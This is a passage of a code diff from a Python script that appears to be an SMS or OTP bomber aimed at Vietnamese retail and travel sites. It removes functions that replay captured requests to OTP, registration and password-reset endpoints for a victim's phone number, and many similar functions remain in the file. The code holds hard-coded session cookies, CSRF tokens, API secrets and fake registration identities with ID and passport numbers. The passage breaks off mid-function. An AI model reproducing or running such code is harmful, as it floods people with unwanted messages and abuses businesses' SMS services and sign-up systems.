-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        'number_phone': sdt,
-        'form_key': 'dlinj8ESlS5lQx06',
-        'currentUrl': 'https://hanoia.com/customer/account/create/',
-    }
-
-    try:
-        response = requests.post('https://hanoia.com/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("HANOIA | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("HANOIA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def ahamove():
     headers = {
@@ -2439,57 +2027,6 @@ def sablanca():
     except requests.exceptions.RequestException:
         print("SABLANCA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def sandro():
-    cookies = {
-        'PHPSESSID': 'e4dm9dd73g7s1p5s8a0408osmu',
-        'form_key': 'MVfTxS24jyAJkIgf',
-        'form_key': 'MVfTxS24jyAJkIgf',
-        'category_first': '3',
-        'mage-cache-storage': '%7B%7D',
-        'mage-cache-storage-section-invalidation': '%7B%7D',
-        'mage-cache-sessid': 'true',
-        'recently_viewed_product': '%7B%7D',
-        'recently_viewed_product_previous': '%7B%7D',
-        'recently_compared_product': '%7B%7D',
-        'recently_compared_product_previous': '%7B%7D',
-        'product_data_storage': '%7B%7D',
-        'mage-messages': '',
-        'mgn_menu_category_1': '21',
-        'private_content_version': '4fa1b90d7f995085e3ce9442f6fa924a',
-        'section_data_ids': '%7B%7D',
-    }
-
-    headers = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': 'PHPSESSID=e4dm9dd73g7s1p5s8a0408osmu; form_key=MVfTxS24jyAJkIgf; form_key=MVfTxS24jyAJkIgf; category_first=3; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; mgn_menu_category_1=21; private_content_version=4fa1b90d7f995085e3ce9442f6fa924a; section_data_ids=%7B%7D',
-        'origin': 'https://sandro.com.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://sandro.com.vn/customer/account/create/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        'number_phone': sdt,
-        'form_key': 'MVfTxS24jyAJkIgf',
-        'currentUrl': 'https://sandro.com.vn/customer/account/create/',
-    }
-
-    try:
-        response = requests.post('https://sandro.com.vn/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("SANDRO | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("SANDRO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def routine():
     cookies = {
         'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
@@ -2539,50 +2076,6 @@ def routine():
     except requests.exceptions.RequestException:
         print("ROUTINE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
         
-def coolmate():
-    cookies = {
-        'device_token': '597f946e29e835d88f56392f40ea75c3',
-        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
-        'cart_quantity': '0',
-        'active-voucher1': 'true',
-        'g_state': '{"i_p":1725246086128,"i_l":4}',
-        'affiliate_content': '%7B%22time_stamp%22%3A1723354726%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_Search_COM_STA_GP_TVN_01062024_EXACTKEWORDS%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Ftat-vo-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.90.220.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221332724879-163056499676-v%5Cu1edb%20tay%20nam%22%2C%22utm_content%22%3A%22700923935895%22%2C%22gclid%22%3A%22Cj0KCQjwn9y1BhC2ARIsAG5IY-4LLvEnGTTKvC3t-KJumETp2sBDpntabX_CQTDiWbXdbv6xHHkYirIaAlkwEALw_wcB%22%7D',
-        'XSRF-TOKEN': 'eyJpdiI6Imw2M1NyN0tWK1NFVWRucUVpRTJOSnc9PSIsInZhbHVlIjoiOWxqYXgrQ0tHK2R4VWtudHZuUzM4bkd1Z1c1TEl4bk1LRDFESlwvTHJRWVdqaFRQXC9jMjlLODA5MzJtcnBrdzMxIiwibWFjIjoiYmI5ZTk4OWFkMmFhZDk3NjhjMzk0N2E5MzhlZDZmMGJjOTE4MTc4MjIwMzZiMjVjMDg1NTllZGVlMzYzYjkxOSJ9',
-        'laravel_session': 'eyJpdiI6Ik96RXlhV1JMVGEzT1E0T0ZCSk05VEE9PSIsInZhbHVlIjoiVWVrdXhaVTI5K3Rlam9SQ1Y4QzhCTEIyRnNcL2xjcmh1Y1dHd0NNOEw5VjR3dzNiNnVaQUl4TlwvcStDOUtwOHVDIiwibWFjIjoiOGMyNWU3ZDBlZTQ1NzdjOGFlZGU4OGZjMjUzNzE1Yzc0OGE4OTg1Y2RhNjEyOTZhMWE2ZmNlZmE4ZDM3OWI2MiJ9',
-    }
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/json',
-        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; g_state={"i_p":1725246086128,"i_l":4}; affiliate_content=%7B%22time_stamp%22%3A1723354726%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_Search_COM_STA_GP_TVN_01062024_EXACTKEWORDS%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Ftat-vo-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.90.220.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221332724879-163056499676-v%5Cu1edb%20tay%20nam%22%2C%22utm_content%22%3A%22700923935895%22%2C%22gclid%22%3A%22Cj0KCQjwn9y1BhC2ARIsAG5IY-4LLvEnGTTKvC3t-KJumETp2sBDpntabX_CQTDiWbXdbv6xHHkYirIaAlkwEALw_wcB%22%7D; XSRF-TOKEN=eyJpdiI6Imw2M1NyN0tWK1NFVWRucUVpRTJOSnc9PSIsInZhbHVlIjoiOWxqYXgrQ0tHK2R4VWtudHZuUzM4bkd1Z1c1TEl4bk1LRDFESlwvTHJRWVdqaFRQXC9jMjlLODA5MzJtcnBrdzMxIiwibWFjIjoiYmI5ZTk4OWFkMmFhZDk3NjhjMzk0N2E5MzhlZDZmMGJjOTE4MTc4MjIwMzZiMjVjMDg1NTllZGVlMzYzYjkxOSJ9; laravel_session=eyJpdiI6Ik96RXlhV1JMVGEzT1E0T0ZCSk05VEE9PSIsInZhbHVlIjoiVWVrdXhaVTI5K3Rlam9SQ1Y4QzhCTEIyRnNcL2xjcmh1Y1dHd0NNOEw5VjR3dzNiNnVaQUl4TlwvcStDOUtwOHVDIiwibWFjIjoiOGMyNWU3ZDBlZTQ1NzdjOGFlZGU4OGZjMjUzNzE1Yzc0OGE4OTg1Y2RhNjEyOTZhMWE2ZmNlZmE4ZDM3OWI2MiJ9',
-        'origin': 'https://www.coolmate.me',
-        'priority': 'u=1, i',
-        'referer': 'https://www.coolmate.me/collection/combo-set-do-gia-tot?itm_source=homepage&itm_medium=herobanner_1&itm_campaign=Sale_giua_thang_15_8_-_Destop_-_fix_3&itm_content=/image/August2024/Sale_giua_thang_15_8_-_Destop_-_fix_3.jpg',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-csrf-token': 'rIG6136gGu756xPVgVVrXfLhxZUjZjmatPQ1iU7u',
-    }
-
-    json_data = {
-        'fullname': 'tran quoc huuh',
-        'email': 'soeasyvn1336@gmail.com',
-        'phone': sdt,
-        'password': '123123aA@',
-        'ajax': True,
-    }
-
-    try:
-        response = requests.post('https://www.coolmate.me/account/register', cookies=cookies, headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("COOLMATE | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("COOLMATE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def mioto():
     cookies = {
@@ -3093,61 +2586,6 @@ def sigo():
     except requests.exceptions.RequestException:
         print("SIGO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def vietravel():
-    cookies = {
-        '__RequestVerificationToken': '8RKGVoT0RgoOu-dbFEENBEdI8ou_c-GbBE0hpUXoEWErCQ6h3pDhCkcTNhYRIzMadgs0mVnNeBGmKIX2TCOv-TjfGCi9qGT2RrXiTnU7YiM1',
-    }
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': '__RequestVerificationToken=8RKGVoT0RgoOu-dbFEENBEdI8ou_c-GbBE0hpUXoEWErCQ6h3pDhCkcTNhYRIzMadgs0mVnNeBGmKIX2TCOv-TjfGCi9qGT2RrXiTnU7YiM1',
-        'origin': 'https://vietravelplus.com',
-        'priority': 'u=1, i',
-        'referer': 'https://vietravelplus.com/dang-ky-hoi-vien',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        '__RequestVerificationToken': '-boYwp8GdxLF-fbAHHLTMCAq6I9hicH4zLr8gNmD6xkCTd67Y6SVZ874-CANjnEadbMKFHf0DPA_eLaFdcUeZGv32kvt8e57fHimy6Sws141',
-        'CustomerName': 'ten la gi',
-        'Phone': sdt,
-        'Birthday': '05/03/1986',
-        'Gender': '1',
-        'IdCard': '001204056664',
-        'id_issue_date': '29/12/2021',
-        'passport_no': '422016774',
-        'Email': 'febjk2@gmail.com',
-        'issue_date': '04/08/2016',
-        'deadline_date': '04/01/2030',
-        'CountryId': 'VN',
-        'ProvinceId': 'ce934e15-eb2e-454c-8235-2d5bef57a855',
-        'DistrictId': '9dbeb6fa-b9bb-4094-b2e2-f7737dc52ca1',
-        'Address': '15 viet ntoei',
-        'OrgCode': 'SGN',
-        'ReferBy': '',
-        'Password': '123123aA@',
-        'RePassword': '123123aA@',
-        'socialid': '',
-        'socialtype': '',
-        'chkDieuKhoan': 'on',
-    }
-
-    try:
-        response = requests.post('https://vietravelplus.com/TheThanhVien/_DangKy', cookies=cookies, headers=headers, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("VIETRAVEL | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("VIETRAVEL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def pnjzl():
     cookies = {
         'CDPI_VISITOR_ID': 'f0af56e8-d456-4674-9f11-1014cd66b0c2',
@@ -3352,107 +2790,6 @@ def mrtho():
     except requests.exceptions.RequestException:
         print("MRTHO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def dominos():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi',
-        'content-type': 'application/json',
-        'dmn': 'CSPLDV',
-        'origin': 'https://dominos.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://dominos.vn/promotion-listing/giam-70-pizza-thu-2?utm_source=IDAC-SEM&utm_medium=cpa&utm_campaign=WDS70&utm_content=Brand-Domino&gad_source=1',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    json_data = {
-        'phone_number': sdt,
-        'email': 'fajpfjasfa2@gmail.com',
-        'type': 0,
-        'is_register': True,
-    }
-
-    try:
-        response = requests.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("DOMINOS | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("DOMINOS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def picoregister():
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi',
-        'content-type': 'application/json',
-        'origin': 'https://pico.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://pico.vn/',
-        'region-code': 'MB',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    json_data = {
-        'name': 'Tran Quang Trinh',
-        'phone': sdt,
-        'provinceCode': '92',
-        'districtCode': '926',
-        'wardCode': '31303',
-        'address': '53 et 3',
-    }
-
-    try:
-        response = requests.post('https://auth.pico.vn/user/api/auth/register', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("PICO REGISTER | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("PICO REGISTER | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def pico():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi',
-        'access': '206f5b6838b4e357e98bf68dbb8cdea5',
-        'channel': 'b2c',
-        'content-type': 'application/json',
-        'origin': 'https://pico.vn',
-        'party': 'ecom',
-        'platform': 'Desktop',
-        'priority': 'u=1, i',
-        'referer': 'https://pico.vn/',
-        'region-code': 'MB',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'uuid': 'e0d012899e3d4e78baa521ade9f4689c',
-    }
-
-    json_data = {
-        'phone': sdt,
-    }
-
-    try:
-        response = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("PICO | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("PICO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def hacom():
     cookies = {
         'fcb677da6e48f7e29e4e541120b3608f': 'u9qe3f8u2a9jj060f3tu4mitg2',
@@ -3622,114 +2959,22 @@ def pasgo():
     except requests.exceptions.RequestException:
         print("PASGO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def coolmatereset():
-    cookies = {
-        'device_token': '597f946e29e835d88f56392f40ea75c3',
-        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
-        'cart_quantity': '0',
-        'active-voucher1': 'true',
-        'g_state': '{"i_p":1725246086128,"i_l":4}',
-        'affiliate_content': '%7B%22time_stamp%22%3A1723196856%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fsan-pham-moi%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.166%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjw_Na1BhAlEiwAM-dm7DYmMVm6OHcCbFOvr-RFQgBrgvAymOlXYufY0hlchR_ukvKc2ePdXxoCzskQAvD_BwE%22%7D',
-        'redirect_url': 'eyJpdiI6ImtRZHYxdzd3Qm45N29NNjNnMlN0dXc9PSIsInZhbHVlIjoiQVNJVEpWcHp2eWQxbGZnSmo2K3ZPbGYxUCttMXNMVURYQzc0YlpHeWNYZFcwMExoQldXazhYZjY0MHc3N0ZBUzFHTTVmdThyMGVoSzNDZ1wvWWRHSVJ3K0JqQU5Ha0h4Z0F4ZkhRdXBqeWxWN0R5MnpTXC9RZU4yN2QzWUlkaWZXXC9kZUdzcXZXcGl6WUNZcWVod2p1dUNxdlVUVlhROHJFaXB0MFFPc1wvVjRHbmVsRGhrSHM1OHhKYVNXRWJ6SFFUOHI0WHpqeHJCMDEyK1hJVXpCaVRiKzVTODRSQTNGTm5LMUlvbEJkMGR4ZjdFZmhTVTBmVXdoRnBza3ZycnNjVWZrTVhidjg3K1grVjJxKytZYzFcL0ZXUU9GM1p6UUt3cTZoTUg0ZURMV3dlS25YR0YrQnR5QVhBNVpsdEY2Wjdwb29mWmw0SlwvUkZTNEFxbFZ0TGZURHl5SzM0eFBHQUhQVmxSUGRzR0hqaWdJPSIsIm1hYyI6IjUxYjEzNDViZmJjNjQ4ZjQ2ZWVlNzUxMTgzZjdlZmRkMzkwMWMzNTVmYjNjNmFlOGM3Y2MzMDFhMjY2NDJhNzkifQ%3D%3D',
-        'XSRF-TOKEN': 'eyJpdiI6IlZtNlhTYTRPeTQ0ZUpJajVEajl5V3c9PSIsInZhbHVlIjoiTlMxckF3Y0JDYjc2cXNwcysybUNuQ1VZaEVFNG1XTG9MRUtUTjdJbmpFdGFrdlYxUXdYbnI5TU9MdlhsV2tWdyIsIm1hYyI6Ijg3YmJjNjRlNDg4NDBkMmI5ODEyNDRhNzlhMjZmNGY3MDJiOTBlMTM0MGM1ZWQyNzI2YjE5NDdjMDg4ZjJjNWQifQ%3D%3D',
-        'laravel_session': 'eyJpdiI6IkpGYXQ5elljYUw2ZlJMTldRQVJjWHc9PSIsInZhbHVlIjoiTDhLM0JnbzBQTExMcmhZcWMrY050ZmxsRjRcL2xBM2k1SGsrMytxSVYxNkRlT2I1MUFLQ1pObkpoMWthVzNSb0YiLCJtYWMiOiIwOGU2YmY1ZjI1ZDZkZDViMjA0ZjE2Njc1YmIzYTM3ZjkxMTM1YTNmOTE2NDZiZTExODAwMjQ2YmQzMmEwY2UxIn0%3D',
-    }
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/json',
-        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; g_state={"i_p":1725246086128,"i_l":4}; affiliate_content=%7B%22time_stamp%22%3A1723196856%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fsan-pham-moi%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.166%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjw_Na1BhAlEiwAM-dm7DYmMVm6OHcCbFOvr-RFQgBrgvAymOlXYufY0hlchR_ukvKc2ePdXxoCzskQAvD_BwE%22%7D; redirect_url=eyJpdiI6ImtRZHYxdzd3Qm45N29NNjNnMlN0dXc9PSIsInZhbHVlIjoiQVNJVEpWcHp2eWQxbGZnSmo2K3ZPbGYxUCttMXNMVURYQzc0YlpHeWNYZFcwMExoQldXazhYZjY0MHc3N0ZBUzFHTTVmdThyMGVoSzNDZ1wvWWRHSVJ3K0JqQU5Ha0h4Z0F4ZkhRdXBqeWxWN0R5MnpTXC9RZU4yN2QzWUlkaWZXXC9kZUdzcXZXcGl6WUNZcWVod2p1dUNxdlVUVlhROHJFaXB0MFFPc1wvVjRHbmVsRGhrSHM1OHhKYVNXRWJ6SFFUOHI0WHpqeHJCMDEyK1hJVXpCaVRiKzVTODRSQTNGTm5LMUlvbEJkMGR4ZjdFZmhTVTBmVXdoRnBza3ZycnNjVWZrTVhidjg3K1grVjJxKytZYzFcL0ZXUU9GM1p6UUt3cTZoTUg0ZURMV3dlS25YR0YrQnR5QVhBNVpsdEY2Wjdwb29mWmw0SlwvUkZTNEFxbFZ0TGZURHl5SzM0eFBHQUhQVmxSUGRzR0hqaWdJPSIsIm1hYyI6IjUxYjEzNDViZmJjNjQ4ZjQ2ZWVlNzUxMTgzZjdlZmRkMzkwMWMzNTVmYjNjNmFlOGM3Y2MzMDFhMjY2NDJhNzkifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IlZtNlhTYTRPeTQ0ZUpJajVEajl5V3c9PSIsInZhbHVlIjoiTlMxckF3Y0JDYjc2cXNwcysybUNuQ1VZaEVFNG1XTG9MRUtUTjdJbmpFdGFrdlYxUXdYbnI5TU9MdlhsV2tWdyIsIm1hYyI6Ijg3YmJjNjRlNDg4NDBkMmI5ODEyNDRhNzlhMjZmNGY3MDJiOTBlMTM0MGM1ZWQyNzI2YjE5NDdjMDg4ZjJjNWQifQ%3D%3D; laravel_session=eyJpdiI6IkpGYXQ5elljYUw2ZlJMTldRQVJjWHc9PSIsInZhbHVlIjoiTDhLM0JnbzBQTExMcmhZcWMrY050ZmxsRjRcL2xBM2k1SGsrMytxSVYxNkRlT2I1MUFLQ1pObkpoMWthVzNSb0YiLCJtYWMiOiIwOGU2YmY1ZjI1ZDZkZDViMjA0ZjE2Njc1YmIzYTM3ZjkxMTM1YTNmOTE2NDZiZTExODAwMjQ2YmQzMmEwY2UxIn0%3D',
-        'origin': 'https://www.coolmate.me',
-        'priority': 'u=1, i',
-        'referer': 'https://www.coolmate.me/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-csrf-token': 'D7iqmZnnMxUtxKkXXepInRbiIubOm2TDB9ci70Y2',
-    }
-
-    json_data = {
-        'address': sdt,
-        'type': 'phone',
-        'prev': '',
-        'ajax': True,
-    }
-
-    try:
-        response = requests.post('https://www.coolmate.me/account/forgotPassword', cookies=cookies, headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("COOLMATERESET | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("COOLMATERESET | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def coolmateresend():
-    cookies = {
-        'device_token': '597f946e29e835d88f56392f40ea75c3',
-        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
-        'cart_quantity': '0',
-        'active-voucher1': 'true',
-        'g_state': '{"i_p":1725246086128,"i_l":4}',
-        'affiliate_content': '%7B%22time_stamp%22%3A1723354726%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_Search_COM_STA_GP_TVN_01062024_EXACTKEWORDS%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Ftat-vo-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.90.220.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221332724879-163056499676-v%5Cu1edb%20tay%20nam%22%2C%22utm_content%22%3A%22700923935895%22%2C%22gclid%22%3A%22Cj0KCQjwn9y1BhC2ARIsAG5IY-4LLvEnGTTKvC3t-KJumETp2sBDpntabX_CQTDiWbXdbv6xHHkYirIaAlkwEALw_wcB%22%7D',
-        'XSRF-TOKEN': 'eyJpdiI6IjlyQjBOY1ZvT2VkQVVnQnVLUkFYSkE9PSIsInZhbHVlIjoiR0NuaHdkeTd5Z2tqTldFV2NDS1Bhc2tRV3E4N0ZTMEI1ZGt4RGxiTjVZZFRTMGhVd0ZWdUNRYzNcL0hnS2tld3oiLCJtYWMiOiI2NWFiNzBkZDQxMzc5NzhhNGQ3ODNhMWRiODI2YmNmMjUzNTQ4MjZiMmQ0MzhiNzBlYTI1YTI5YzQ3YjJhNGMwIn0%3D',
